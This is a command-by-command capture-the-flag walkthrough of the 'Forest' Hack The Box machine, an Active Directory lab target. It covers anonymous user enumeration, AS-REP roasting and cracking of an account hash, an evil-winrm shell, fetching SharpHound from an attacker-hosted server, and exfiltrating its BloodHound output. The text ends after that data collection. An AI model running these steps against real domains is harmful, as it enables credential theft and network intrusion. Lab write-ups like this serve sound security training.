# Forest
```bash
nmap -sC -sV 10.129.95.210
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 05:41 EDT
Nmap scan report for 10.129.95.210
Host is up (0.059s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-05-24 09:48:41Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-05-24T02:48:49-07:00
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m48s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-05-24T09:48:46
|_  start_date: 2024-05-24T09:43:13

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.43 seconds
```
```bash
rpcclient 10.129.95.210 -U%
rpcclient $> enumdousers
command not found: enumdousers
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
```bash
go to https://www.tarlogic.com/blog/how-to-attack-kerberos/ and download GetNPUsers.py
python3 GetNPUsers.py -dc-ip 10.129.95.210 htb.local/svc-alfresco -debug 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
Password:
[+] Connecting to 10.129.95.210, port 389, SSL False
[*] Cannot authenticate svc-alfresco, getting its TGT
[+] Trying to connect to KDC at 10.129.95.210:88
$krb5asrep$23$svc-alfresco@HTB.LOCAL:3e734e9ce368b653c5cb583ebff6781e$a7ebc1589162f136dbb414043b6acfcd5156740a1006300c7a6050fc4aa3cf756c5ce7a29957b4bcc8ddf4745a72eaff216b4cc78a4ab3d5f6e1fd6bea41f95701cd37ad1d6d14c9e68fdd402dff35616215585efe48c6efbd43fcc4fb6d176457bdb5bff92dc0fc018e47e10614d10f88b48bd1059cf0f33998297316e614df3b524dee5e838de57751962a51db54abcc5c247bdad671b9555942035277956358f028d45764a364969cf39353d235ca41b061feb3962beae467fa8446dcd13c043c6d516533ed560e7eb9689637a3bb690340e3cb3e87251b38c077c55483a3642a22c22bcc

nano finally.hash  #paste the hash inside                                                                                                                                          
john --wordlist=/usr/share/wordlists/rockyou.txt finally.hash                       
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:02 DONE (2024-05-24 07:26) 0.5000g/s 2042Kp/s 2042Kc/s 2042KC/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/24/2024   2:44 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
84c60af93a18d675a783dd92df54a8e8
```
```bash
download bloodhound
sudo apt install bloodhound
sudo neo4j console
bloodhound
Go to https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.1
and Download  SharpHound-v1.1.1.zip and unzip it 
```
```bash
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```bash
C:\Users\svc-alfresco\Desktop> wget http://10.10.14.56:80/Downloads/SharpHound.exe -OutFile C:\Users\svc-alfresco\Desktop\SharpHound.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/24/2024   6:44 AM        1052160 SharpHound.exe
-a----        5/24/2024   6:32 AM        1308348 SharpHound.ps1
-ar---        5/24/2024   2:44 AM             34 user.txt

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ./SharpHound.exe
2024-05-24T06:46:50.3915590-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-05-24T06:46:50.4853092-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-05-24T06:46:50.5009338-07:00|INFORMATION|Initializing SharpHound at 6:46 AM on 5/24/2024
2024-05-24T06:46:50.6259358-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2024-05-24T06:46:50.6415604-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-05-24T06:46:50.8134341-07:00|INFORMATION|Beginning LDAP search for htb.local
2024-05-24T06:46:50.8759384-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-05-24T06:46:50.8759384-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-05-24T06:47:21.5479120-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2024-05-24T06:47:35.7979074-07:00|INFORMATION|Consumers finished, closing output channel
2024-05-24T06:47:35.8291588-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-05-24T06:47:35.9854074-07:00|INFORMATION|Status: 161 objects finished (+161 3.577778)/s -- Using 46 MB RAM
2024-05-24T06:47:35.9854074-07:00|INFORMATION|Enumeration finished in 00:00:45.1691124
2024-05-24T06:47:36.0479088-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 117 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-05-24T06:47:36.0635376-07:00|INFORMATION|SharpHound Enumeration Completed at 6:47 AM on 5/24/2024! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/24/2024   6:47 AM          18630 20240524064735_BloodHound.zip
-a----        5/24/2024   6:47 AM          19538 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        5/24/2024   6:44 AM        1052160 SharpHound.exe
-a----        5/24/2024   6:32 AM        1308348 SharpHound.ps1
-ar---        5/24/2024   2:44 AM             34 user.txt

C:\Users\svc-alfresco\Desktop> download C:\Users\svc-alfresco\Desktop\20240524064735_BloodHound.zip /home/user/Desktop/bloodhound.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Desktop\20240524064735_BloodHound.zip to /home/user/Desktop/bloodhound.zip
                                        
Info: Download successful!
```
